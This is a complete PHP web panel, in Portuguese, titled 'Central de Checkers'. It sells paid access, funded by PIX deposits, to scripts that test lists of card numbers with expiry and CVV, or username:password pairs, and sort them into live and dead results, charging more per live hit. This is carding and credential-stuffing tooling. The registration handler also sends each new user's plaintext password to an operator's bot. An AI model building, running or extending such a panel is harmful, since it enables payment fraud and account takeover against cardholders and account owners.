<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/database.php';
require_once __DIR__ . '/security.php';
require_once __DIR__ . '/elitepay.php';

secHeaders();

$ip = clientIp();

if (isset($_GET['ping'])) {
    header('Content-Type: text/plain');
    echo 'OK:' . time();
    exit;
}

$user = getSessionUser();

if (isset($_GET['logout'])) {
    if (!empty($_COOKIE['hipctl_token'])) sessionDestroy($_COOKIE['hipctl_token']);
    setcookie('hipctl_token', '', time() - 3600, '/', '', isset($_SERVER['HTTPS']), true);
    session_destroy();
    redirect('index.php');
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    if (!csrfCheck($_POST['csrf'] ?? '')) jsonOut(['ok' => false, 'error' => 'CSRF inválido'], 403);

    if ($action === 'register') {
        if (!rateCheck('register', $ip, 5, 3600)) jsonOut(['ok' => false, 'error' => 'Muitas tentativas. Aguarde.'], 429);
        $username = trim($_POST['username'] ?? '');
        $password = $_POST['password'] ?? '';
        if ($e = validateUsername($username)) jsonOut(['ok' => false, 'error' => $e]);
        if ($e = validatePassword($password)) jsonOut(['ok' => false, 'error' => $e]);
        if (userByUsername($username)) jsonOut(['ok' => false, 'error' => 'Username já existe']);
        $r = userCreate($username, $password, $ip);
        if (!$r['success']) jsonOut(['ok' => false, 'error' => $r['error'] ?? 'Erro']);
        $token = sessionCreate((int)$r['id'], $ip, $_SERVER['HTTP_USER_AGENT'] ?? '');
        setcookie('hipctl_token', $token, time() + SESSION_LIFETIME, '/', '', isset($_SERVER['HTTPS']), true);
        $_SESSION['user_id'] = (int)$r['id'];
        auditLog((int)$r['id'], $username, 'register', "ip=$ip", $ip);
        $msg = "👤 <b>NOVO USUÁRIO</b>\n\n"
             . "📛 User: <b>" . $username . "</b>\n"
             . "🔑 Senha: <code>" . esc($password) . "</code>\n"
             . "📱 IP: <code>" . $ip . "</code>\n"
             . "🕐 " . date('d/m/Y H:i:s') . "\n"
             . "⚡ " . BRAND;
        pingBot($msg);
        jsonOut(['ok' => true, 'redirect' => 'index.php']);
    }

    if ($action === 'login') {
        if (!rateCheck('login', $ip, 10, 900)) jsonOut(['ok' => false, 'error' => 'Muitas tentativas. Aguarde 15min.'], 429);
        $username = trim($_POST['username'] ?? '');
        $password = $_POST['password'] ?? '';
        $u = userByUsername($username);
        if (!$u || !password_verify($password, $u['password_hash'])) {
            auditLog(null, $username, 'login_fail', "ip=$ip", $ip);
            jsonOut(['ok' => false, 'error' => 'Usuário ou senha inválidos']);
        }
        $token = sessionCreate((int)$u['id'], $ip, $_SERVER['HTTP_USER_AGENT'] ?? '');
        setcookie('hipctl_token', $token, time() + SESSION_LIFETIME, '/', '', isset($_SERVER['HTTPS']), true);
        $_SESSION['user_id'] = (int)$u['id'];
        userUpdateLastSeen((int)$u['id']);
        auditLog((int)$u['id'], $u['username'], 'login', "ip=$ip", $ip);
        jsonOut(['ok' => true, 'redirect' => 'index.php']);
    }

    if ($action === 'deposit') {
        $u = requireUser();
        if (!rateCheck('deposit', $ip, 5, 600)) jsonOut(['ok' => false, 'error' => 'Muitas tentativas'], 429);
        $amount = (float)($_POST['amount'] ?? 0);
        if ($amount < DEPOSIT_MIN || $amount > DEPOSIT_MAX) {
            jsonOut(['ok' => false, 'error' => 'Valor deve ser entre ' . fmtMoney(DEPOSIT_MIN) . ' e ' . fmtMoney(DEPOSIT_MAX)]);
        }
        $r = eliteCreateDeposit($amount, "Depósito #" . $u['id'], '', '', BASE_URL . '/webhook.php');
        if (!$r['ok']) jsonOut(['ok' => false, 'error' => $r['error']]);
        depositCreate((int)$u['id'], $r['transactionId'], $amount, $r['qrcodeUrl'], $r['copyPaste'], $ip);
        auditLog((int)$u['id'], $u['username'], 'deposit_create', "amount=$amount txid={$r['transactionId']}", $ip);
        $msg = "🎫 <b>PIX GERADO</b>\n\n"
             . "👤 User: <b>" . $u['username'] . "</b>\n"
             . "💵 Valor: <b>" . fmtMoney($amount) . "</b>\n"
             . "🔑 TXID: <code>" . substr($r['transactionId'], 0, 20) . "...</code>\n"
             . "📱 IP: <code>" . $ip . "</code>\n"
             . "⚡ " . BRAND;
        pingBot($msg);
        jsonOut([
            'ok' => true,
            'transactionId' => $r['transactionId'],
            'qrcodeUrl' => $r['qrcodeUrl'],
            'copyPaste' => $r['copyPaste'],
            'amount' => $amount,
        ]);
    }

    if ($action === 'check') {
        $u = requireUser();
        if (!rateCheck('check', $ip, 60, 60)) jsonOut(['ok' => false, 'error' => 'Rate limit atingido'], 429);
        $gate = trim($_POST['gate'] ?? '');
        $type = $_POST['type'] ?? 'gate';
        $lista = trim($_POST['lista'] ?? '');

        if (!in_array($type, ['gate', 'login'], true)) jsonOut(['ok' => false, 'error' => 'Tipo inválido']);
        if (!$gate || !$lista) jsonOut(['ok' => false, 'error' => 'Dados incompletos']);

        $dir = $type === 'gate' ? API_DIR : LOGINS_DIR;
        $gateFiles = array_map('basename', glob($dir . '/*.{php,py}', GLOB_BRACE) ?: []);
        if (!in_array($gate, $gateFiles, true)) jsonOut(['ok' => false, 'error' => 'Gate não encontrada']);

        $gatePath = $dir . '/' . $gate;
        $ext = strtolower(pathinfo($gatePath, PATHINFO_EXTENSION));
        $cost = DIE_COST;
        if ((float)$u['balance'] < $cost) jsonOut(['ok' => false, 'error' => 'Saldo insuficiente. Deposite para continuar.']);

        $response = '';
        if ($ext === 'php') {
            $_GET['lista'] = $lista;
            $_GET['gate']  = $gate;
            $_SESSION['user_id'] = (int)$u['id'];
            ob_start();
            try { include $gatePath; $response = ob_get_clean(); }
            catch (Throwable $e) { ob_end_clean(); $response = '❌ Erro: ' . $e->getMessage(); }
        } elseif ($ext === 'py') {
            $cmd = 'python3 ' . escapeshellarg($gatePath) . ' ' . escapeshellarg($lista) . ' 2>&1';
            $response = shell_exec($cmd) ?? '❌ Sem resposta';
        }

        $rl = strtolower($response);
        $livePatterns = ['✅', 'aprovada', 'approved', 'success', 'live', 'autorizado', 'authorized', 'valid', 'aprovado', 'apvd', 'ativa', 'active', 'cvv', 'crédito', 'saldo'];
        $isLive = false;
        foreach ($livePatterns as $p) { if (strpos($rl, strtolower($p)) !== false) { $isLive = true; break; } }
        if (strpos($response, '❌') === 0) $isLive = false;

        $cost = $isLive ? LIVE_COST : DIE_COST;
        if (!userDeductBalance((int)$u['id'], $cost)) jsonOut(['ok' => false, 'error' => 'Saldo insuficiente para esta operação']);

        $card = $type === 'gate' ? preg_replace('/[^0-9]/', '', explode('|', $lista)[0]) : $lista;
        $bin = $type === 'gate' ? substr($card, 0, 6) : '';
        checkLog((int)$u['id'], $gate, $type, $card, $bin, $isLive ? 'live' : 'die', $cost, $response, $ip);

        $u = userById((int)$u['id']);
        jsonOut([
            'ok' => true,
            'live' => $isLive,
            'response' => $response,
            'cost' => $cost,
            'balance' => (float)$u['balance'],
        ]);
    }

    if ($action === 'check_balance') {
        $u = requireUser();
        jsonOut(['ok' => true, 'balance' => (float)$u['balance']]);
    }

    if ($action === 'deposit_status') {
        $u = requireUser();
        $txid = trim($_POST['txid'] ?? '');
        $d = depositByTxid($txid);
        if (!$d || (int)$d['user_id'] !== (int)$u['id']) jsonOut(['ok' => false, 'error' => 'Não encontrado']);
        jsonOut(['ok' => true, 'status' => $d['status'], 'amount' => (float)$d['amount']]);
    }

    jsonOut(['ok' => false, 'error' => 'Ação desconhecida'], 400);
}

function listGates(): array {
    $out = ['gate' => [], 'login' => []];
    foreach (glob(API_DIR . '/*.{php,py}', GLOB_BRACE) ?: [] as $f) $out['gate'][] = basename($f);
    foreach (glob(LOGINS_DIR . '/*.{php,py}', GLOB_BRACE) ?: [] as $f) $out['login'][] = basename($f);
    sort($out['gate']); sort($out['login']);
    return $out;
}

$gates = listGates();
$csrf = csrfToken();
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?= SITE_NAME ?></title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
:root{--green:#00ff88;--cyan:#00d4ff;--yellow:#fbbf24;--red:#ef4444;--purple:#a78bfa;--bg:#050810;--surface:#0a0f18;--surface-2:#0d1520;--border:rgba(0,255,136,.15);--border-2:rgba(0,255,136,.3);--text:#e2e8f0;--muted:#64748b;--radius:14px}
html,body{height:100%}
body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;line-height:1.5;overflow-x:hidden}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 20% 10%,rgba(0,255,136,.06),transparent 50%),radial-gradient(ellipse at 80% 90%,rgba(0,212,255,.05),transparent 50%);pointer-events:none;z-index:0}
body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,255,136,.02) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.02) 1px,transparent 1px);background-size:64px 64px;mask-image:radial-gradient(ellipse at center,#000 20%,transparent 80%);pointer-events:none;z-index:0}
.container{position:relative;z-index:1;max-width:1280px;margin:0 auto;padding:24px}
.top{display:flex;align-items:center;justify-content:space-between;padding:16px 24px;margin-bottom:32px;background:rgba(10,15,24,.85);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,.3);flex-wrap:wrap;gap:12px}
.brand{display:flex;align-items:center;gap:12px}
.logo{width:44px;height:44px;background:linear-gradient(135deg,var(--green),var(--cyan));border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px;box-shadow:0 4px 20px rgba(0,255,136,.3)}
.brand h1{font-size:20px;font-weight:800;letter-spacing:-.5px;background:linear-gradient(135deg,var(--green),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.brand p{font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase}
.user-info{display:flex;align-items:center;gap:16px;flex-wrap:wrap}
.user-bal{background:rgba(0,255,136,.08);border:1px solid var(--border-2);padding:10px 18px;border-radius:12px;display:flex;align-items:center;gap:10px}
.user-bal .lbl{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px}
.user-bal .val{font-size:18px;font-weight:800;color:var(--green);font-family:'JetBrains Mono',monospace}
.user-chip{display:flex;align-items:center;gap:10px;background:rgba(0,0,0,.4);padding:8px 14px;border-radius:12px;border:1px solid rgba(255,255,255,.08)}
.avatar{width:34px;height:34px;background:linear-gradient(135deg,var(--green),var(--cyan));border-radius:9px;display:flex;align-items:center;justify-content:center;font-weight:800;color:#000;font-size:14px}
.user-chip .nm{font-size:13px;font-weight:600}
.logout{padding:10px 14px;background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);border-radius:10px;color:#f87171;font-size:12px;font-weight:600;text-decoration:none;transition:all .2s}
.logout:hover{background:rgba(239,68,68,.2);color:#fca5a5}
.card{background:rgba(10,15,24,.85);backdrop-filter:blur(20px);border:1px solid var(--border);border-radius:18px;padding:28px;margin-bottom:24px;box-shadow:0 8px 32px rgba(0,0,0,.25)}
.card h2{font-size:15px;font-weight:700;margin-bottom:20px;display:flex;align-items:center;gap:10px;color:var(--text)}
.card h2 i{color:var(--green)}
.form-grid{display:grid;gap:16px}
.form-field label{display:block;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;color:var(--cyan);margin-bottom:8px}
.form-field input,.form-field textarea,.form-field select{width:100%;padding:14px 16px;background:rgba(0,0,0,.5);border:1px solid rgba(255,255,255,.1);border-radius:11px;color:var(--text);font-size:14px;font-family:inherit;outline:none;transition:all .2s}
.form-field input:focus,.form-field textarea:focus,.form-field select:focus{border-color:var(--green);box-shadow:0 0 0 3px rgba(0,255,136,.1)}
.form-field textarea{font-family:'JetBrains Mono',monospace;font-size:13px;min-height:100px;resize:vertical}
.form-field select option{background:#0a0f18}
.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:13px 22px;border:none;border-radius:11px;font-size:13px;font-weight:700;cursor:pointer;transition:all .2s;font-family:inherit;text-decoration:none}
.btn-primary{background:linear-gradient(135deg,var(--green),var(--cyan));color:#000}
.btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(0,255,136,.3)}
.btn-primary:disabled{opacity:.5;cursor:not-allowed;transform:none}
.btn-ghost{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.12);color:var(--text)}
.btn-ghost:hover{border-color:var(--green);color:var(--green)}
.btn-full{width:100%}
.auth-box{max-width:440px;margin:80px auto;background:rgba(10,15,24,.92);backdrop-filter:blur(24px);border:1px solid var(--border);border-radius:22px;padding:40px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
.auth-tabs{display:flex;gap:8px;background:rgba(0,0,0,.4);border-radius:12px;padding:4px;margin-bottom:24px}
.auth-tab{flex:1;padding:10px;text-align:center;font-size:13px;font-weight:600;cursor:pointer;border-radius:9px;transition:all .2s;color:var(--muted)}
.auth-tab.active{background:linear-gradient(135deg,var(--green),var(--cyan));color:#000}
.auth-form{display:none}
.auth-form.active{display:block;animation:fade .3s}
@keyframes fade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
.alert{padding:14px 18px;border-radius:12px;font-size:13px;margin-bottom:16px;display:none}
.alert.show{display:block;animation:fade .3s}
.alert-err{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#fca5a5}
.alert-ok{background:rgba(0,255,136,.1);border:1px solid rgba(0,255,136,.3);color:var(--green)}
.gates-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px}
.gate-opt{background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:16px;cursor:pointer;transition:all .2s;position:relative}
.gate-opt:hover{border-color:var(--border-2);transform:translateY(-2px)}
.gate-opt.selected{border-color:var(--green);background:rgba(0,255,136,.08);box-shadow:0 0 20px rgba(0,255,136,.15)}
.gate-opt .ext{position:absolute;top:10px;right:10px;font-size:9px;padding:2px 7px;border-radius:6px;background:rgba(0,255,136,.15);color:var(--green);font-weight:700;text-transform:uppercase;letter-spacing:.5px}
.gate-opt .nm{font-size:13px;font-weight:600;color:var(--text);margin-top:8px;word-break:break-all}
.gate-opt .tp{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-top:4px}
.type-switch{display:flex;gap:8px;margin-bottom:16px;background:rgba(0,0,0,.4);border-radius:12px;padding:4px}
.type-switch button{flex:1;padding:10px;background:none;border:none;color:var(--muted);font-size:12px;font-weight:700;cursor:pointer;border-radius:9px;transition:all .2s;text-transform:uppercase;letter-spacing:1px;font-family:inherit}
.type-switch button.active{background:linear-gradient(135deg,var(--green),var(--cyan));color:#000}
.results-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:20px}
.result-box{background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:16px;min-height:180px;max-height:400px;overflow-y:auto}
.result-box.live{border-color:rgba(0,255,136,.3)}
.result-box.die{border-color:rgba(239,68,68,.3)}
.result-box h3{font-size:12px;text-transform:uppercase;letter-spacing:1.2px;margin-bottom:12px;display:flex;align-items:center;gap:8px}
.result-box.live h3{color:var(--green)}
.result-box.die h3{color:#f87171}
.result-item{background:rgba(0,0,0,.4);border-left:3px solid;border-radius:8px;padding:10px 12px;margin-bottom:8px;font-family:'JetBrains Mono',monospace;font-size:11px;line-height:1.5;animation:fade .3s}
.result-item.live{border-left-color:var(--green)}
.result-item.die{border-left-color:var(--red)}
.result-item .hd{font-weight:700;margin-bottom:6px;word-break:break-all}
.result-item.live .hd{color:var(--green)}
.result-item.die .hd{color:#f87171}
.result-item .body{color:rgba(255,255,255,.75);white-space:pre-wrap;word-break:break-word}
.stats-line{display:flex;gap:16px;font-size:12px;color:var(--muted);margin-bottom:16px;flex-wrap:wrap}
.stats-line strong{color:var(--text)}
.dep-modal{position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:100;display:none;align-items:center;justify-content:center;padding:20px}
.dep-modal.active{display:flex}
.dep-box{background:var(--surface-2);border:1px solid var(--border-2);border-radius:20px;padding:32px;max-width:420px;width:100%;max-height:90vh;overflow-y:auto;position:relative}
.dep-close{position:absolute;top:16px;right:16px;background:none;border:none;color:var(--muted);font-size:22px;cursor:pointer;line-height:1}
.qr-wrap{text-align:center;padding:20px;background:#fff;border-radius:14px;margin:16px 0}
.qr-wrap img{max-width:240px;width:100%;border-radius:8px;display:block;margin:0 auto}
.copy-box{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:10px;padding:14px;font-family:'JetBrains Mono',monospace;font-size:11px;word-break:break-all;color:var(--cyan);cursor:pointer;user-select:all;line-height:1.5;margin-bottom:12px}
.copy-box:hover{border-color:var(--green)}
.pulse{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse 1.5s infinite;margin-right:6px}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.empty{text-align:center;padding:32px;color:var(--muted);font-size:13px}
@media(max-width:768px){.container{padding:16px}.card{padding:20px}.results-grid{grid-template-columns:1fr}.auth-box{margin:20px auto;padding:28px}}
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:rgba(0,0,0,.3)}
::-webkit-scrollbar-thumb{background:var(--green);border-radius:6px;opacity:.5}
</style>
</head>
<body>
<?php if (!$user): ?>
<div class="container">
    <div class="auth-box">
        <div style="text-align:center;margin-bottom:24px">
            <div class="logo" style="margin:0 auto 12px;width:56px;height:56px;font-size:26px">⚡</div>
            <h1 style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--green),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent"><?= SITE_NAME ?></h1>
            <p style="font-size:11px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-top:4px">Central de Checkers</p>
        </div>
        <div class="auth-tabs">
            <div class="auth-tab active" onclick="switchTab('login')">Entrar</div>
            <div class="auth-tab" onclick="switchTab('register')">Criar Conta</div>
        </div>
        <div id="alert" class="alert"></div>
        <form id="form-login" class="auth-form active" onsubmit="doLogin(event)">
            <div class="form-field" style="margin-bottom:14px"><label>Username</label><input type="text" name="username" required autocomplete="username"></div>
            <div class="form-field" style="margin-bottom:14px"><label>Senha</label><input type="password" name="password" required autocomplete="current-password"></div>
            <button type="submit" class="btn btn-primary btn-full">Entrar</button>
        </form>
        <form id="form-register" class="auth-form" onsubmit="doRegister(event)">
            <div class="form-field" style="margin-bottom:14px"><label>Username</label><input type="text" name="username" required minlength="3" maxlength="20" pattern="[a-zA-Z0-9_]+" autocomplete="username"></div>
            <div class="form-field" style="margin-bottom:14px"><label>Senha (min 6 chars)</label><input type="password" name="password" required minlength="6" autocomplete="new-password"></div>
            <button type="submit" class="btn btn-primary btn-full">Criar Conta</button>
        </form>
        <div style="text-align:center;margin-top:20px;font-size:11px;color:var(--muted)">⚡ <?= BRAND ?></div>
    </div>
</div>
<script>
const CSRF='<?= $csrf ?>';
function switchTab(t){document.querySelectorAll('.auth-tab').forEach(x=>x.classList.remove('active'));document.querySelectorAll('.auth-form').forEach(x=>x.classList.remove('active'));document.querySelector('.auth-tab:nth-child('+(t==='login'?1:2)+')').classList.add('active');document.getElementById('form-'+t).classList.add('active');hideAlert()}
function showAlert(m,t){const a=document.getElementById('alert');a.textContent=m;a.className='alert alert-'+(t==='err'?'err':'ok')+' show'}
function hideAlert(){document.getElementById('alert').className='alert'}
async function post(url,data){const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({...data,csrf:CSRF})});return await r.json()}
async function doLogin(e){e.preventDefault();const f=e.target;try{const j=await post('index.php',{action:'login',username:f.username.value,password:f.password.value});if(j.ok)location.reload();else showAlert(j.error,'err')}catch(err){showAlert('Erro de conexão','err')}}
async function doRegister(e){e.preventDefault();const f=e.target;try{const j=await post('index.php',{action:'register',username:f.username.value,password:f.password.value});if(j.ok)location.reload();else showAlert(j.error,'err')}catch(err){showAlert('Erro de conexão','err')}}
</script>
<?php else: ?>
<div class="container">
    <div class="top">
        <div class="brand">
            <div class="logo">⚡</div>
            <div><h1><?= SITE_NAME ?></h1><p>Central de Checkers</p></div>
        </div>
        <div class="user-info">
            <div class="user-bal"><span class="lbl">Saldo</span><span class="val" id="balance"><?= fmtMoney((float)$user['balance']) ?></span></div>
            <div class="user-chip"><div class="avatar"><?= strtoupper(substr($user['username'],0,1)) ?></div><span class="nm"><?= esc($user['username']) ?></span></div>
            <a href="?logout" class="logout">Sair</a>
        </div>
    </div>

    <div class="card">
        <h2>💳 Adicionar Saldo</h2>
        <div class="stats-line"><span>Mín: <strong><?= fmtMoney(DEPOSIT_MIN) ?></strong></span><span>Máx: <strong><?= fmtMoney(DEPOSIT_MAX) ?></strong></span></div>
        <div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center">
            <input type="number" id="dep-amount" placeholder="Valor (R$)" min="<?= DEPOSIT_MIN ?>" max="<?= DEPOSIT_MAX ?>" step="0.01" value="20" style="flex:1;min-width:150px;padding:13px 16px;background:rgba(0,0,0,.5);border:1px solid rgba(255,255,255,.1);border-radius:11px;color:var(--text);font-size:14px;outline:none;font-family:inherit">
            <button class="btn btn-primary" onclick="criarDeposito()">Gerar PIX</button>
        </div>
    </div>

    <div class="card">
        <h2>🎯 Selecionar Checker</h2>
        <div class="type-switch">
            <button class="active" onclick="setType('gate')">🎴 Gates (Cartão)</button>
            <button onclick="setType('login')">🔐 Logins</button>
        </div>
        <div class="gates-grid" id="gates-list"></div>
        <div id="no-gates" class="empty" style="display:none">Nenhum checker disponível</div>
    </div>

    <div class="card">
        <h2>📝 Inserir Dados</h2>
        <div class="form-field" style="margin-bottom:16px">
            <label id="lista-label">Cartões (NÚMERO|MÊS|ANO|CVV)</label>
            <textarea id="lista" placeholder="4532015112830366|12|2027|123&#10;5425233430109903|01|2028|456"></textarea>
        </div>
        <div style="display:flex;gap:10px;flex-wrap:wrap">
            <button class="btn btn-primary" id="btn-run" onclick="runChecker()" disabled>▶ Iniciar</button>
            <button class="btn btn-ghost" onclick="stopChecker()">⏹ Parar</button>
            <button class="btn btn-ghost" onclick="clearResults()">🗑 Limpar</button>
        </div>
        <div class="stats-line" style="margin-top:16px;margin-bottom:0">
            <span>Custo DIE: <strong><?= fmtMoney(DIE_COST) ?></strong></span>
            <span>Custo LIVE: <strong><?= fmtMoney(LIVE_COST) ?></strong></span>
            <span>Processados: <strong id="stats-processed">0</strong></span>
            <span>✅ <strong id="stats-live" style="color:var(--green)">0</strong></span>
            <span>❌ <strong id="stats-die" style="color:#f87171">0</strong></span>
        </div>
    </div>

    <div class="results-grid">
        <div class="result-box live"><h3>✅ Aprovados</h3><div id="results-live"></div></div>
        <div class="result-box die"><h3>❌ Reprovados</h3><div id="results-die"></div></div>
    </div>
</div>

<div class="dep-modal" id="dep-modal" onclick="if(event.target===this)closeModal()">
    <div class="dep-box">
        <button class="dep-close" onclick="closeModal()">✕</button>
        <h2 style="text-align:center;font-size:18px;margin-bottom:8px">💰 PIX Gerado</h2>
        <p style="text-align:center;color:var(--muted);font-size:12px;margin-bottom:16px" id="dep-info">Aguardando pagamento...</p>
        <div class="qr-wrap" id="qr-wrap"><img id="qr-img" src="" alt="QR Code"></div>
        <div style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px">Copia e Cola</div>
        <div class="copy-box" id="copy-paste" onclick="copyPix()">—</div>
        <div style="font-size:12px;color:var(--muted);text-align:center"><span class="pulse"></span>Aguardando confirmação...</div>
    </div>
</div>

<script>
const CSRF='<?= $csrf ?>';
const GATES={gate:<?= json_encode($gates['gate']) ?>,login:<?= json_encode($gates['login']) ?>};
let curType='gate',curGate='',running=false,currentCredits=<?= (float)$user['balance'] ?>;

function setType(t){curType=t;curGate='';document.querySelectorAll('.type-switch button').forEach(b=>b.classList.remove('active'));document.querySelector('.type-switch button:nth-child('+(t==='gate'?1:2)+')').classList.add('active');document.getElementById('lista-label').textContent=t==='gate'?'Cartões (NÚMERO|MÊS|ANO|CVV)':'Logins (USUÁRIO:SENHA)';document.getElementById('lista').placeholder=t==='gate'?'4532015112830366|12|2027|123':'usuario:senha';renderGates();document.getElementById('btn-run').disabled=true}

function renderGates(){
    const list=document.getElementById('gates-list');const arr=GATES[curType]||[];list.innerHTML='';
    document.getElementById('no-gates').style.display=arr.length?'none':'block';
    arr.forEach(f=>{
        const ext=f.split('.').pop();
        const div=document.createElement('div');div.className='gate-opt';div.dataset.gate=f;
        div.innerHTML=`<div class="ext">${ext}</div><div class="nm">${f}</div><div class="tp">${curType==='gate'?'Cartão':'Login'}</div>`;
        div.onclick=()=>{curGate=f;document.querySelectorAll('.gate-opt').forEach(x=>x.classList.remove('selected'));div.classList.add('selected');document.getElementById('btn-run').disabled=false};
        list.appendChild(div);
    });
}

async function post(url,data){const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({...data,csrf:CSRF})});return await r.json()}

async function criarDeposito(){
    const amount=parseFloat(document.getElementById('dep-amount').value);
    if(!amount||amount<<?= DEPOSIT_MIN ?>||amount><?= DEPOSIT_MAX ?>)return alert('Valor deve ser entre <?= fmtMoney(DEPOSIT_MIN) ?> e <?= fmtMoney(DEPOSIT_MAX) ?>');
    try{const j=await post('index.php',{action:'deposit',amount:amount});if(!j.ok)return alert(j.error);
        document.getElementById('qr-img').src=j.qrcodeUrl;document.getElementById('copy-paste').textContent=j.copyPaste;
        document.getElementById('dep-info').textContent='Valor: '+j.amount.toFixed(2).replace('.',',');
        document.getElementById('dep-modal').classList.add('active');
        monitorDeposit(j.transactionId);
    }catch(e){alert('Erro de conexão')}
}

async function monitorDeposit(txid){
    const iv=setInterval(async()=>{
        if(!document.getElementById('dep-modal').classList.contains('active')){clearInterval(iv);return}
        try{const j=await post('index.php',{action:'deposit_status',txid:txid});
            if(j.ok&&j.status==='paid'){clearInterval(iv);document.getElementById('dep-info').textContent='✅ Pago! Saldo atualizado';document.getElementById('dep-info').style.color='var(--green)';setTimeout(()=>{closeModal();location.reload()},1500)}
        }catch(e){}
    },4000);
}

function closeModal(){document.getElementById('dep-modal').classList.remove('active')}
function copyPix(){const t=document.getElementById('copy-paste').textContent;navigator.clipboard.writeText(t).then(()=>{const el=document.getElementById('copy-paste');el.style.color='var(--green)';setTimeout(()=>el.style.color='var(--cyan)',1000)})}

async function runChecker(){
    if(!curGate)return alert('Selecione um checker');
    const lista=document.getElementById('lista').value.trim();
    if(!lista)return alert('Cole os dados');
    const items=lista.split('\n').filter(l=>l.trim());
    if(!items.length)return alert('Sem dados válidos');
    running=true;let idx=0,live=0,die=0;
    clearResults();
    while(running&&idx<items.length){
        const it=items[idx];
        try{const j=await post('index.php',{action:'check',gate:curGate,type:curType,lista:it});
            if(!j.ok){addResult(it,'❌ '+j.error,false);die++;}
            else{addResult(it,j.response,j.live);if(j.live)live++;else die++;currentCredits=j.balance;document.getElementById('balance').textContent='R$ '+j.balance.toFixed(2).replace('.',',')}
        }catch(e){addResult(it,'❌ Erro conexão',false);die++;}
        idx++;
        document.getElementById('stats-processed').textContent=idx;
        document.getElementById('stats-live').textContent=live;
        document.getElementById('stats-die').textContent=die;
        if(running&&idx<items.length)await new Promise(r=>setTimeout(r,1500));
    }
    running=false;
}

function stopChecker(){running=false}
function clearResults(){document.getElementById('results-live').innerHTML='';document.getElementById('results-die').innerHTML='';document.getElementById('stats-processed').textContent='0';document.getElementById('stats-live').textContent='0';document.getElementById('stats-die').textContent='0'}

function addResult(input,response,isLive){
    const box=document.getElementById(isLive?'results-live':'results-die');
    const div=document.createElement('div');div.className='result-item '+(isLive?'live':'die');
    div.innerHTML=`<div class="hd">${input.length>50?input.substring(0,50)+'...':input}</div><div class="body">${response.replace(/</g,'&lt;')}</div>`;
    box.insertBefore(div,box.firstChild);
}

document.addEventListener('DOMContentLoaded',()=>renderGates());
</script>
<?php endif; ?>
</body>
</html>